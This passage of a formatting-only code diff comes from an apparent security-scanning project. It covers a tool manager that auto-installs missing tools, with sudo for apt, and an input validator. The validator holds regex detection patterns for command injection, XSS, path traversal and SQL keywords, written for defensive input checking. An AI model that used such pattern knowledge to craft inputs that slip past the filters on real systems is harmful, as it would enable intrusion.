f'virtual:{virtual_tools[tool_name]}',\n-                    'implementation': virtual_tools[tool_name],\n-                    'type': 'virtual',\n-                    'checked_at': current_time\n+                    \"available\": True,\n+                    \"path\": f\"virtual:{virtual_tools[tool_name]}\",\n+                    \"implementation\": virtual_tools[tool_name],\n+                    \"type\": \"virtual\",\n+                    \"checked_at\": current_time,\n                 }\n-                return f'virtual:{virtual_tools[tool_name]}'\n-            \n+                return f\"virtual:{virtual_tools[tool_name]}\"\n+\n             # Check alternatives\n             tool_config = self.tools.get(tool_name)\n             if tool_config:\n                 for alt in tool_config.alternatives:\n                     alt_path = shutil.which(alt)\n                     if alt_path:\n                         self.tool_status[tool_name] = {\n-                            'available': True,\n-                            'path': alt_path,\n-                            'alternative': alt,\n-                            'checked_at': current_time\n+                            \"available\": True,\n+                            \"path\": alt_path,\n+                            \"alternative\": alt,\n+                            \"checked_at\": current_time,\n                         }\n                         return alt_path\n-            \n+\n             # Tool not found\n             self.tool_status[tool_name] = {\n-                'available': False,\n-                'path': None,\n-                'checked_at': current_time\n+                \"available\": False,\n+                \"path\": None,\n+                \"checked_at\": current_time,\n             }\n             return None\n-    \n+\n     def _update_tool_status(self):\n         \"\"\"Update status for all known tools\"\"\"\n         for tool_name in self.tools.keys():\n             self.which(tool_name)\n-    \n+\n     def get_tool_status(self) -> Dict[str, Dict]:\n         \"\"\"Get current status of all tools\"\"\"\n         self._update_tool_status()\n         return self.tool_status.copy()\n-    \n+\n     def get_missing_critical_tools(self) -> List[str]:\n         \"\"\"Get list of missing critical tools\"\"\"\n         missing = []\n         for tool_name, config in self.tools.items():\n             if config.required and not self.which(tool_name):\n                 missing.append(tool_name)\n         return missing\n-    \n+\n     def auto_install_tool(self, tool_name: str) -> Tuple[bool, str]:\n         \"\"\"Attempt to automatically install a tool\"\"\"\n         tool_config = self.tools.get(tool_name)\n         if not tool_config:\n             return False, f\"Unknown tool: {tool_name}\"\n-        \n+\n         try:\n-            if tool_config.install_method == 'go':\n+            if tool_config.install_method == \"go\":\n                 return self._install_go_tool(tool_config)\n-            elif tool_config.install_method == 'apt':\n+            elif tool_config.install_method == \"apt\":\n                 return self._install_apt_tool(tool_config)\n             else:\n-                return False, f\"Unsupported install method: {tool_config.install_method}\"\n-        \n+                return (\n+                    False,\n+                    f\"Unsupported install method: {tool_config.install_method}\",\n+                )\n+\n         except Exception as e:\n             return False, f\"Installation failed: {str(e)}\"\n-    \n+\n     def _install_go_tool(self, config: ToolConfig) -> Tuple[bool, str]:\n         \"\"\"Install a Go-based tool\"\"\"\n-        if not shutil.which('go'):\n+        if not shutil.which(\"go\"):\n             return False, \"Go compiler not available\"\n-        \n+\n         try:\n             # Set up Go environment\n             env = os.environ.copy()\n             home = Path.home()\n-            env['GOPATH'] = str(home / 'go')\n-            env['GOBIN'] = str(home / 'go' / 'bin')\n-            \n+            env[\"GOPATH\"] = str(home / \"go\")\n+            env[\"GOBIN\"] = str(home / \"go\" / \"bin\")\n+\n             # Ensure GOBIN directory exists\n-            gobin = home / 'go' / 'bin'\n+            gobin = home / \"go\" / \"bin\"\n             gobin.mkdir(parents=True, exist_ok=True)\n-            \n+\n             # Run installation\n             result = subprocess.run(\n-                config.install_cmd,\n-                env=env,\n-                capture_output=True,\n-                text=True,\n-                timeout=300\n+                config.install_cmd, env=env, capture_output=True, text=True, timeout=300\n             )\n-            \n+\n             if result.returncode == 0:\n                 # Verify installation\n                 time.sleep(2)  # Give filesystem time to sync\n                 if self.which(config.name):\n                     return True, f\"Successfully installed {config.name}\"\n                 else:\n-                    return False, f\"Installation completed but {config.name} not found in PATH\"\n+                    return (\n+                        False,\n+                        f\"Installation completed but {config.name} not found in PATH\",\n+                    )\n             else:\n                 return False, f\"Installation failed: {result.stderr}\"\n-        \n+\n         except subprocess.TimeoutExpired:\n             return False, \"Installation timed out\"\n         except Exception as e:\n             return False, f\"Installation error: {str(e)}\"\n-    \n+\n     def _install_apt_tool(self, config: ToolConfig) -> Tuple[bool, str]:\n         \"\"\"Install an apt-based tool (requires sudo)\"\"\"\n         try:\n             result = subprocess.run(\n-                ['sudo'] + config.install_cmd,\n+                [\"sudo\"] + config.install_cmd,\n                 capture_output=True,\n                 text=True,\n-                timeout=300\n+                timeout=300,\n             )\n-            \n+\n             if result.returncode == 0:\n                 time.sleep(2)\n                 if self.which(config.name):\n                     return True, f\"Successfully installed {config.name}\"\n                 else:\n                     return False, f\"Installation completed but {config.name} not found\"\n             else:\n                 return False, f\"APT installation failed: {result.stderr}\"\n-        \n+\n         except subprocess.TimeoutExpired:\n             return False, \"APT installation timed out\"\n         except Exception as e:\n             return False, f\"APT installation error: {str(e)}\"\n-    \n-    def install_missing_tools(self, critical_only: bool = True) -> Dict[str, Tuple[bool, str]]:\n+\n+    def install_missing_tools(\n+        self, critical_only: bool = True\n+    ) -> Dict[str, Tuple[bool, str]]:\n         \"\"\"Install all missing tools\"\"\"\n         results = {}\n-        missing_tools = self.get_missing_critical_tools() if critical_only else list(self.tools.keys())\n-        \n+        missing_tools = (\n+            self.get_missing_critical_tools()\n+            if critical_only\n+            else list(self.tools.keys())\n+        )\n+\n         for tool_name in missing_tools:\n             if not self.which(tool_name):\n                 success, message = self.auto_install_tool(tool_name)\n                 results[tool_name] = (success, message)\n-        \n+\n         return results\n-    \n+\n     def get_tool_alternatives(self, tool_name: str) -> List[str]:\n         \"\"\"Get available alternatives for a tool\"\"\"\n         tool_config = self.tools.get(tool_name)\n         if not tool_config:\n             return []\n-        \n+\n         available_alternatives = []\n         for alt in tool_config.alternatives:\n             if self.which(alt):\n                 available_alternatives.append(alt)\n-        \n+\n         return available_alternatives\n-    \n+\n     def suggest_fallbacks(self, tool_name: str) -> List[str]:\n         \"\"\"Suggest fallback options for a missing tool\"\"\"\n         suggestions = []\n-        \n+\n         # Check for alternatives\n         alternatives = self.get_tool_alternatives(tool_name)\n         if alternatives:\n             suggestions.extend([f\"Use alternative: {alt}\" for alt in alternatives])\n-        \n+\n         # Check if auto-install is possible\n         tool_config = self.tools.get(tool_name)\n         if tool_config and tool_config.install_cmd:\n-            if tool_config.install_method == 'go' and shutil.which('go'):\n-                suggestions.append(f\"Auto-install via Go: {' '.join(tool_config.install_cmd)}\")\n-            elif tool_config.install_method == 'apt':\n-                suggestions.append(f\"Install via APT: {' '.join(tool_config.install_cmd)}\")\n-        \n+            if tool_config.install_method == \"go\" and shutil.which(\"go\"):\n+                suggestions.append(\n+                    f\"Auto-install via Go: {' '.join(tool_config.install_cmd)}\"\n+                )\n+            elif tool_config.install_method == \"apt\":\n+                suggestions.append(\n+                    f\"Install via APT: {' '.join(tool_config.install_cmd)}\"\n+                )\n+\n         return suggestions\n-    \n+\n     def export_tool_report(self, file_path: str):\n         \"\"\"Export detailed tool status report\"\"\"\n         report = {\n-            'timestamp': datetime.now().isoformat(),\n-            'summary': {\n-                'total_tools': len(self.tools),\n-                'available_tools': len([t for t in self.tool_status.values() if t.get('available')]),\n-                'missing_critical': len(self.get_missing_critical_tools())\n+            \"timestamp\": datetime.now().isoformat(),\n+            \"summary\": {\n+                \"total_tools\": len(self.tools),\n+                \"available_tools\": len(\n+                    [t for t in self.tool_status.values() if t.get(\"available\")]\n+                ),\n+                \"missing_critical\": len(self.get_missing_critical_tools()),\n             },\n-            'tools': {}\n+            \"tools\": {},\n         }\n-        \n+\n         for tool_name, config in self.tools.items():\n             status = self.tool_status.get(tool_name, {})\n             alternatives = self.get_tool_alternatives(tool_name)\n-            \n-            report['tools'][tool_name] = {\n-                'available': status.get('available', False),\n-                'path': status.get('path'),\n-                'alternative_used': status.get('alternative'),\n-                'required': config.required,\n-                'install_method': config.install_method,\n-                'alternatives_available': alternatives,\n-                'fallback_suggestions': self.suggest_fallbacks(tool_name) if not status.get('available') else []\n+\n+            report[\"tools\"][tool_name] = {\n+                \"available\": status.get(\"available\", False),\n+                \"path\": status.get(\"path\"),\n+                \"alternative_used\": status.get(\"alternative\"),\n+                \"required\": config.required,\n+                \"install_method\": config.install_method,\n+                \"alternatives_available\": alternatives,\n+                \"fallback_suggestions\": (\n+                    self.suggest_fallbacks(tool_name)\n+                    if not status.get(\"available\")\n+                    else []\n+                ),\n             }\n-        \n-        with open(file_path, 'w') as f:\n+\n+        with open(file_path, \"w\") as f:\n             json.dump(report, f, indent=2)\n+\n \n # Global tool manager instance\n tool_manager = ToolManager()\n+\n \n def enhanced_which(tool_name: str) -> Optional[str]:\n     \"\"\"Enhanced which function with intelligent fallbacks\"\"\"\n     return tool_manager.which(tool_name)\n \n+\n def check_tool_availability() -> Dict[str, bool]:\n     \"\"\"Check availability of all tools\"\"\"\n     status = tool_manager.get_tool_status()\n-    return {tool: info.get('available', False) for tool, info in status.items()}\n+    return {tool: info.get(\"available\", False) for tool, info in status.items()}\n+\n \n def install_missing_tools(critical_only: bool = True) -> Dict[str, Tuple[bool, str]]:\n     \"\"\"Install missing tools automatically\"\"\"\n     return tool_manager.install_missing_tools(critical_only)\n+\n \n def get_tool_coverage_report() -> Dict[str, Any]:\n     \"\"\"Get comprehensive tool coverage report\"\"\"\n     status = tool_manager.get_tool_status()\n     total_tools = len(status)\n-    available_tools = len([t for t in status.values() if t.get('available')])\n-    \n+    available_tools = len([t for t in status.values() if t.get(\"available\")])\n+\n     return {\n-        'total_tools': total_tools,\n-        'available_tools': available_tools,\n-        'coverage_percentage': (available_tools / total_tools * 100) if total_tools > 0 else 0,\n-        'missing_critical': tool_manager.get_missing_critical_tools(),\n-        'detailed_status': status\n+        \"total_tools\": total_tools,\n+        \"available_tools\": available_tools,\n+        \"coverage_percentage\": (\n+            (available_tools / total_tools * 100) if total_tools > 0 else 0\n+        ),\n+        \"missing_critical\": tool_manager.get_missing_critical_tools(),\n+        \"detailed_status\": status,\n     }\n+\n \n if __name__ == \"__main__\":\n     # Test the tool manager\n     print(\"Enhanced Tool Manager - Test\")\n-    \n+\n     report = get_tool_coverage_report()\n     print(f\"Tool Coverage: {report['coverage_percentage']:.1f}%\")\n     print(f\"Available: {report['available_tools']}/{report['total_tools']}\")\n-    \n-    if report['missing_critical']:\n+\n+    if report[\"missing_critical\"]:\n         print(f\"Missing critical tools: {', '.join(report['missing_critical'])}\")\n-        \n+\n         # Try to install missing tools\n         print(\"Attempting to install missing tools...\")\n         results = install_missing_tools(critical_only=True)\n-        \n+\n         for tool, (success, message) in results.items():\n             status = \"\u2705\" if success else \"\u274c\"\n             print(f\"{status} {tool}: {message}\")\n     else:\n-        print(\"\u2705 All critical tools are available!\")\n\\ No newline at end of file\n+        print(\"\u2705 All critical tools are available!\")\n--- /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_validation.py\t2025-09-14 19:10:58.550754+00:00\n+++ /home/runner/work/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PantheonV2/Bl4ckC3ll_PANTHEON-main/enhanced_validation.py\t2025-09-14 19:23:11.346527+00:00\n@@ -12,431 +12,489 @@\n from typing import Dict, List, Any, Optional, Tuple, Set\n from dataclasses import dataclass, field\n from datetime import datetime, timedelta\n import ipaddress\n from urllib.parse import urlparse\n+\n try:\n     import dns.resolver\n+\n     DNS_AVAILABLE = True\n except ImportError:\n     DNS_AVAILABLE = False\n import requests\n from collections import defaultdict, Counter\n \n+\n @dataclass\n class ValidationResult:\n     \"\"\"Result of input validation\"\"\"\n+\n     is_valid: bool\n     cleaned_input: str\n     validation_type: str\n     confidence_score: float = 0.0\n     warnings: List[str] = field(default_factory=list)\n     suggestions: List[str] = field(default_factory=list)\n \n+\n @dataclass\n class ReliabilityMetrics:\n     \"\"\"Track reliability metrics for scanning operations\"\"\"\n+\n     total_operations: int = 0\n     successful_operations: int = 0\n     failed_operations: int = 0\n     false_positives: int = 0\n     verified_findings: int = 0\n     avg_response_time: float = 0.0\n     last_updated: datetime = field(default_factory=datetime.now)\n-    \n+\n     @property\n     def success_rate(self) -> float:\n         if self.total_operations == 0:\n             return 0.0\n         return self.successful_operations / self.total_operations\n-    \n+\n     @property\n     def accuracy_rate(self) -> float:\n         total_findings = self.false_positives + self.verified_findings\n         if total_findings == 0:\n             return 1.0\n         return self.verified_findings / total_findings\n \n+\n class EnhancedValidator:\n     \"\"\"Enhanced input validation with security and reliability focus\"\"\"\n-    \n+\n     def __init__(self):\n         self.domain_pattern = re.compile(\n-            r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\\.)*[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?$'\n+            r\"^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\\.)*[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?$\"\n         )\n-        self.ip_pattern = re.compile(r'^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$')\n+        self.ip_pattern = re.compile(r\"^(?:[0-9]{1,3}\\.){3}[0-9]{1,3}$\")\n         self.url_pattern = re.compile(\n-            r'^https?://(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\\.)*[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?::[0-9]{1,5})?(?:/.*)?$'\n+            r\"^https?://(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\\.)*[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(?::[0-9]{1,5})?(?:/.*)?$\"\n         )\n-        \n+\n         # Security patterns to detect and sanitize\n         self.dangerous_patterns = [\n-            r'[;&|`$(){}]',  # Command injection\n-            r'<script[^>]*>.*?</script>',  # XSS\n-            r'(\\.\\./|\\.\\.\\\\)',  # Path traversal\n-            r'(union|select|insert|delete|update|drop)\\s+',  # SQL injection keywords\n-            r'javascript:',  # JavaScript protocol\n-            r'data:',  # Data protocol\n-            r'file:',  # File protocol\n+            r\"[;&|`$(){}]\",  # Command injection\n+            r\"<script[^>]*>.*?</script>\",  # XSS\n+            r\"(\\.\\./|\\.\\.\\\\)\",  # Path traversal\n+            r\"(union|select|insert|delete|update|drop)\\s+\",  # SQL injection keywords\n+            r\"javascript:\",  # JavaScript protocol\n+            r\"data:\",  # Data protocol\n+            r\"file:\",  # File protocol\n         ]\n-        \n-        self.compiled_dangerous_patterns = [re.compile(pattern, re.IGNORECASE) for pattern in self.dangerous_patterns]\n-    \n+\n+        self.compiled_dangerous_patterns = [\n+            re.compile(pattern, re.IGNORECASE) for pattern in self.dangerous_patterns\n+        ]\n+\n     def validate_domain(self, domain: str) -> ValidationResult:\n         \"\"\"Enhanced domain validation with security checks and DNS verification\"\"\"\n         if not domain or not isinstance(domain, str):\n-            return ValidationResult(False, \"\", \"domain\", 0.0, [\"Empty or invalid input\"])\n-        \n+            return ValidationResult(\n+                False, \"\", \"domain\", 0.0, [\"Empty or invalid input\"]\n+            )\n+\n         # Clean and normalize\n         cleaned = domain.strip().lower()\n         warnings = []\n         suggestions = []\n         confidence = 0.0\n-        \n+\n         # Security checks\n         for pattern in self.compiled_dangerous_patterns:\n             if pattern.search(cleaned):\n-                return ValidationResult(False, \"\", \"domain\", 0.0, [\"Potentially malicious input detected\"])\n-        \n+                return ValidationResult(\n+                    False, \"\", \"domain\", 0.0, [\"Potentially malicious input detected\"]\n+                )\n+\n         # Length checks\n         if len(cleaned) > 253:\n-            return ValidationResult(False, \"\", \"domain\", 0.0, [\"Domain too long (max 253 characters)\"])\n-        \n+            return ValidationResult(\n+                False, \"\", \"domain\", 0.0, [\"Domain too long (max 253 characters)\"]\n+            )\n+\n         if len(cleaned) < 1:\n             return ValidationResult(False, \"\", \"domain\", 0.0, [\"Domain too short\"])\n-        \n+\n         # Pattern validation\n         if not self.domain_pattern.match(cleaned):\n             return ValidationResult(False, \"\", \"domain\", 0.0, [\"Invalid domain format\"])\n-        \n+\n         # DNS verification (optional - adds reliability)\n         if DNS_AVAILABLE:\n             try:\n-                dns.resolver.resolve(cleaned, 'A')\n+                dns.resolver.resolve(cleaned, \"A\")\n                 confidence += 0.4\n             except:\n                 warnings.append(\"Domain does not resolve to IP address\")\n                 suggestions.append(\"Verify domain is active and properly configured\")\n         else:\n             warnings.append(\"DNS verification unavailable\")\n             suggestions.append(\"Install dnspython for enhanced domain validation\")\n-        \n+\n         # Additional checks\n-        if cleaned.count('.') == 0:\n+        if cleaned.count(\".\") == 0:\n             warnings.append(\"No subdomain detected - might be incomplete\")\n             confidence -= 0.1\n         else:\n             confidence += 0.2\n-        \n+\n         # Check for suspicious characteristics\n         if len(cleaned) > 50:\n             warnings.append(\"Unusually long domain name\")\n-        \n-        if re.search(r'\\d{1,3}-\\d{1,3}-\\d{1,3}-\\d{1,3}', cleaned):\n-            suggestions.append(\"Domain appears to be IP-based - consider using IP validation\")\n-        \n+\n+        if re.search(r\"\\d{1,3}-\\d{1,3}-\\d{1,3}-\\d{1,3}\", cleaned):\n+            suggestions.append(\n+                \"Domain appears to be IP-based - consider using IP validation\"\n+            )\n+\n         confidence = max(0.0, min(1.0, confidence + 0.4))  # Base confidence\n-        \n-        return ValidationResult(True, cleaned, \"domain\", confidence, warnings, suggestions)\n-    \n+\n+        return ValidationResult(\n+            True, cleaned, \"domain\", confidence, warnings, suggestions\n+        )\n+\n     def validate_ip(self, ip: str) -> ValidationResult:\n         \"\"\"Enhanced IP validation with range and security checks\"\"\"\n         if not ip or not isinstance(ip, str):\n             return ValidationResult(False, \"\", \"ip\", 0.0, [\"Empty or invalid input\"])\n-        \n+\n         cleaned = ip.strip()\n         warnings = []\n         suggestions = []\n         confidence = 0.8  # Base confidence for valid IPs\n-        \n+\n         # Security checks\n         for pattern in self.compiled_dangerous_patterns:\n             if pattern.search(cleaned):\n-                return ValidationResult(False, \"\", \"ip\", 0.0, [\"Potentially malicious input detected\"])\n-        \n+                return ValidationResult(\n+                    False, \"\", \"ip\", 0.0, [\"Potentially malicious input detected\"]\n+                )\n+\n         try:\n             ip_obj = ipaddress.ip_address(cleaned)\n-            \n+\n             # Check for private/special ranges\n             if ip_obj.is_private:\n                 warnings.append(\"Private IP address - may not be accessible externally\")\n                 confidence -= 0.2\n-            \n+\n             if ip_obj.is_loopback:\n                 warnings.append(\"Loopback address detected\")\n                 suggestions.append(\"Consider using external IP for security testing\")\n                 confidence -= 0.3\n-            \n+\n             if ip_obj.is_reserved:\n                 warnings.append(\"Reserved IP address\")\n                 confidence -= 0.2\n-            \n+\n             if ip_obj.is_multicast:\n-                return ValidationResult(False, \"\", \"ip\", 0.0, [\"Multicast addresses not supported\"])\n-            \n+                return ValidationResult(\n+                    False, \"\", \"ip\", 0.0, [\"Multicast addresses not supported\"]\n+                )\n+\n             # Version-specific checks\n             if isinstance(ip_obj, ipaddress.IPv6Address):\n                 suggestions.append(\"IPv6 address - ensure tools support IPv6\")\n                 confidence -= 0.1\n-            \n-            return ValidationResult(True, cleaned, \"ip\", confidence, warnings, suggestions)\n-        \n+\n+            return ValidationResult(\n+                True, cleaned, \"ip\", confidence, warnings, suggestions\n+            )\n+\n         except ValueError:\n             return ValidationResult(False, \"\", \"ip\", 0.0, [\"Invalid IP address format\"])\n-    \n+\n     def validate_url(self, url: str) -> ValidationResult:\n         \"\"\"Enhanced URL validation with security and accessibility checks\"\"\"\n         if not url or not isinstance(url, str):\n             return ValidationResult(False, \"\", \"url\", 0.0, [\"Empty or invalid input\"])\n-        \n+\n         cleaned = url.strip()\n         warnings = []\n         suggestions = []\n         confidence = 0.6  # Base confidence\n-        \n+\n         # Security checks\n         for pattern in self.compiled_dangerous_patterns:\n             if pattern.search(cleaned):\n-                return ValidationResult(False, \"\", \"url\", 0.0, [\"Potentially malicious input detected\"])\n-        \n+                return ValidationResult(\n+                    False, \"\", \"url\", 0.0, [\"Potentially malicious input detected\"]\n+                )\n+\n         # Add protocol if missing\n-        if not cleaned.startswith(('http://', 'https://')):\n-            cleaned = 'https://' + cleaned\n-            suggestions.append(\"Added HTTPS protocol - consider verifying correct protocol\")\n-        \n+        if not cleaned.startswith((\"http://\", \"https://\")):\n+            cleaned = \"https://\" + cleaned\n+            suggestions.append(\n+                \"Added HTTPS protocol - consider verifying correct protocol\"\n+            )\n+\n         try:\n             parsed = urlparse(cleaned)\n-            \n+\n             # Validate components\n             if not parsed.netloc:\n-                return ValidationResult(False, \"\", \"url\", 0.0, [\"Missing hostname in URL\"])\n-            \n+                return ValidationResult(\n+                    False, \"\", \"url\", 0.0, [\"Missing hostname in URL\"]\n+                )\n+\n             # Security checks\n-            if parsed.scheme not in ['http', 'https']:\n-                return ValidationResult(False, \"\", \"url\", 0.0, [\"Only HTTP/HTTPS protocols supported\"])\n-            \n-            if parsed.scheme == 'http':\n+            if parsed.scheme not in [\"http\", \"https\"]:\n+                return ValidationResult(\n+                    False, \"\", \"url\", 0.0, [\"Only HTTP/HTTPS protocols supported\"]\n+                )\n+\n+            if parsed.scheme == \"http\":\n                 warnings.append(\"Using HTTP (unencrypted) - consider HTTPS\")\n                 confidence -= 0.1\n             else:\n                 confidence += 0.1\n-            \n+\n             # Port validation\n             if parsed.port:\n                 if parsed.port < 1 or parsed.port > 65535:\n-                    return ValidationResult(False, \"\", \"url\", 0.0, [\"Invalid port number\"])\n+                    return ValidationResult(\n+                        False, \"\", \"url\", 0.0, [\"Invalid port number\"]\n+                    )\n                 if parsed.port not in [80, 443, 8080, 8443]:\n                     warnings.append(f\"Non-standard port {parsed.port} detected\")\n-            \n+\n             # Domain validation\n-            domain_result = self.validate_domain(parsed.netloc.split(':')[0])\n+            domain_result = self.validate_domain(parsed.netloc.split(\":\")[0])\n             if not domain_result.is_valid:\n-                return ValidationResult(False, \"\", \"url\", 0.0, [\"Invalid domain in URL\"])\n-            \n+                return ValidationResult(\n+                    False, \"\", \"url\", 0.0, [\"Invalid domain in URL\"]\n+                )\n+\n             confidence += domain_result.confidence_score * 0.3\n             warnings.extend(domain_result.warnings)\n-            \n+\n             # Accessibility check (optional)\n             try:\n                 response = requests.head(cleaned, timeout=10, allow_redirects=True)\n                 if response.status_code < 400:\n                     confidence += 0.2\n                 else:\n                     warnings.append(f\"URL returned status code {response.status_code}\")\n             except:\n                 warnings.append(\"URL accessibility could not be verified\")\n-            \n-            return ValidationResult(True, cleaned, \"url\", confidence, warnings, suggestions)\n-        \n+\n+            return ValidationResult(\n+                True, cleaned, \"url\", confidence, warnings, suggestions\n+            )\n+\n         except Exception as e:\n-            return ValidationResult(False, \"\", \"url\", 0.0, [f\"URL parsing error: {str(e)}\"])\n-    \n-    def validate_input_list(self, inputs: List[str], input_type: str = \"auto\") -> List[ValidationResult]:\n+            return ValidationResult(\n+                False, \"\", \"url\", 0.0, [f\"URL parsing error: {str(e)}\"]\n+            )\n+\n+    def validate_input_list(\n+        self, inputs: List[str], input_type: str = \"auto\"\n+    ) -> List[ValidationResult]:\n         \"\"\"Validate a list of inputs with type auto-detection\"\"\"\n         results = []\n-        \n+\n         for inp in inputs:\n             if input_type == \"auto\":\n                 # Auto-detect input type\n                 if self.ip_pattern.match(inp.strip()):\n                     result = self.validate_ip(inp)\n-                elif inp.strip().startswith(('http://', 'https://')):\n+                elif inp.strip().startswith((\"http://\", \"https://\")):\n                     result = self.validate_url(inp)\n                 else:\n                     result = self.validate_domain(inp)\n             elif input_type == \"domain\":\n                 result = self.validate_domain(inp)\n             elif input_type == \"ip\":\n                 result = self.validate_ip(inp)\n             elif input_type == \"url\":\n                 result = self.validate_url(inp)\n             else:\n-                result = ValidationResult(False, \"\", \"unknown\", 0.0, [\"Unknown input type\"])\n-            \n+                result = ValidationResult(\n+                    False, \"\", \"unknown\", 0.0, [\"Unknown input type\"]\n+                )\n+\n             results.append(result)\n-        \n+\n         return results\n-    \n-    def bulk_validate_and_clean(self, inputs: List[str]) -> Tuple[List[str], List[str], Dict[str, Any]]:\n+\n+    def bulk_validate_and_clean(\n+        self, inputs: List[str]\n+    ) -> Tuple[List[str], List[str], Dict[str, Any]]:\n         \"\"\"Bulk validate inputs and return cleaned valid inputs, invalid inputs, and stats\"\"\"\n         results = self.validate_input_list(inputs)\n-        \n+\n         valid_inputs = []\n         invalid_inputs = []\n         stats = {\n-            'total': len(inputs),\n-            'valid': 0,\n-            'invalid': 0,\n-            'avg_confidence': 0.0,\n-            'warnings_count': 0,\n-            'types_detected': Counter()\n+            \"total\": len(inputs),\n+            \"valid\": 0,\n+            \"invalid\": 0,\n+            \"avg_confidence\": 0.0,\n+            \"warnings_count\": 0,\n+            \"types_detected\": Counter(),\n         }\n-        \n+\n         total_confidence = 0.0\n-        \n+\n         for inp, result in zip(inputs, results):\n             if result.is_valid:\n                 valid_inputs.append(result.cleaned_input)\n-                stats['valid'] += 1\n+                stats[\"valid\"] += 1\n                 total_confidence += result.confidence_score\n-                stats['types_detected'][result.validation_type] += 1\n+                stats[\"types_detected\"][result.validation_type] += 1\n             else:\n                 invalid_inputs.append(inp)\n-                stats['invalid'] += 1\n-            \n-            stats['warnings_count'] += len(result.warnings)\n-        \n-        if stats['valid'] > 0:\n-            stats['avg_confidence'] = total_confidence / stats['valid']\n-        \n+                stats[\"invalid\"] += 1\n+\n+            stats[\"warnings_count\"] += len(result.warnings)\n+\n+        if stats[\"valid\"] > 0:\n+            stats[\"avg_confidence\"] = total_confidence / stats[\"valid\"]\n+\n         return valid_inputs, invalid_inputs, stats\n+\n \n class ReliabilityTracker:\n     \"\"\"Track and improve system reliability\"\"\"\n-    \n+\n     def __init__(self):\n         self.metrics: Dict[str, ReliabilityMetrics] = defaultdict(ReliabilityMetrics)\n         self.verification_cache: Dict[str, Dict] = {}\n         self.false_positive_patterns: Set[str] = set()\n-    \n-    def record_operation(self, operation_type: str, success: bool, response_time: float = 0.0):\n+\n+    def record_operation(\n+        self, operation_type: str, success: bool, response_time: float = 0.0\n+    ):\n         \"\"\"Record the result of an operation\"\"\"\n         metrics = self.metrics[operation_type]\n         metrics.total_operations += 1\n-        \n+\n         if success:\n             metrics.successful_operations += 1\n         else:\n             metrics.failed_operations += 1\n-        \n+\n         # Update average response time\n         if response_time > 0:\n             current_avg = metrics.avg_response_time\n             total_ops = metrics.total_operations\n-            metrics.avg_response_time = ((current_avg * (total_ops - 1)) + response_time) / total_ops\n-        \n+            metrics.avg_response_time = (\n+                (current_avg * (total_ops - 1)) + response_time\n+            ) / total_ops\n+\n         metrics.last_updated = datetime.now()\n-    \n-    def record_finding_verification(self, operation_type: str, finding_hash: str, is_verified: bool):\n+\n+    def record_finding_verification(\n+        self, operation_type: str, finding_hash: str, is_verified: bool\n+    ):\n         \"\"\"Record whether a finding was verified as true positive or false positive\"\"\"\n         metrics = self.metrics[operation_type]\n-        \n+\n         if is_verified:\n             metrics.verified_findings += 1\n         else:\n             metrics.false_positives += 1\n             # Add to false positive patterns for learning\n             self.false_positive_patterns.add(finding_hash[:8])  # Store partial hash\n-    \n+\n     def is_likely_false_positive(self, finding_data: str) -> bool:\n         \"\"\"Check if a finding is likely a false positive based on patterns\"\"\"\n         finding_hash = hashlib.md5(finding_data.encode()).hexdigest()\n         return finding_hash[:8] in self.false_positive_patterns\n-    \n+\n     def get_reliability_score(self, operation_type: str) -> float:\n         \"\"\"Get overall reliability score for an operation type\"\"\"\n         metrics = self.metrics.get(operation_type)\n         if not metrics or metrics.total_operations == 0:\n             return 0.0\n-        \n+\n         # Weighted score combining success rate and accuracy\n         success_weight = 0.6\n         accuracy_weight = 0.4\n-        \n-        return (metrics.success_rate * success_weight) + (metrics.accuracy_rate * accuracy_weight)\n-    \n+\n+        return (metrics.success_rate * success_weight) + (\n+            metrics.accuracy_rate * accuracy_weight\n+        )\n+\n     def get_performance_summary(self) -> Dict[str, Any]:\n         \"\"\"Get comprehensive performance summary\"\"\"\n-        summary = {\n-            'overall_reliability': 0.0,\n-            'operations': {},\n-            'recommendations': []\n-        }\n-        \n+        summary = {\"overall_reliability\": 0.0, \"operations\": {}, \"recommendations\": []}\n+\n         total_reliability = 0.0\n         operation_count = 0\n-        \n+\n         for op_type, metrics in self.metrics.items():\n             reliability = self.get_reliability_score(op_type)\n             total_reliability += reliability\n             operation_count += 1\n-            \n-            summary['operations'][op_type] = {\n-                'success_rate': metrics.success_rate,\n-                'accuracy_rate': metrics.accuracy_rate,\n-                'reliability_score': reliability,\n-                'total_operations': metrics.total_operations,\n-                'avg_response_time': metrics.avg_response_time\n+\n+            summary[\"operations\"][op_type] = {\n+                \"success_rate\": metrics.success_rate,\n+                \"accuracy_rate\": metrics.accuracy_rate,\n+                \"reliability_score\": reliability,\n+                \"total_operations\": metrics.total_operations,\n+                \"avg_response_time\": metrics.avg_response_time,\n             }\n-            \n+\n             # Generate recommendations\n             if metrics.success_rate < 0.8:\n-                summary['recommendations'].append(f\"Improve {op_type} success rate (currently {metrics.success_rate:.1%})\")\n-            \n+                summary[\"recommendations\"].append(\n+                    f\"Improve {op_type} success rate (currently {metrics.success_rate:.1%})\"\n+                )\n+\n             if metrics.accuracy_rate < 0.9:\n-                summary['recommendations'].append(f\"Reduce {op_type} false positives (accuracy: {metrics.accuracy_rate:.1%})\")\n-        \n+                summary[\"recommendations\"].append(\n+                    f\"Reduce {op_type} false positives (accuracy: {metrics.accuracy_rate:.1%})\"\n+                )\n+\n         if operation_count > 0:\n-            summary['overall_reliability'] = total_reliability / operation_count\n-        \n+            summary[\"overall_reliability\"] = total_reliability / operation_count\n+\n         return summary\n-    \n+\n     def export_metrics(self, file_path: str):\n         \"\"\"Export reliability metrics to file\"\"\"\n         export_data = {\n-            'timestamp': datetime.now().isoformat(),\n-            'summary': self.get_performance_summary(),\n-            'detailed_metrics': 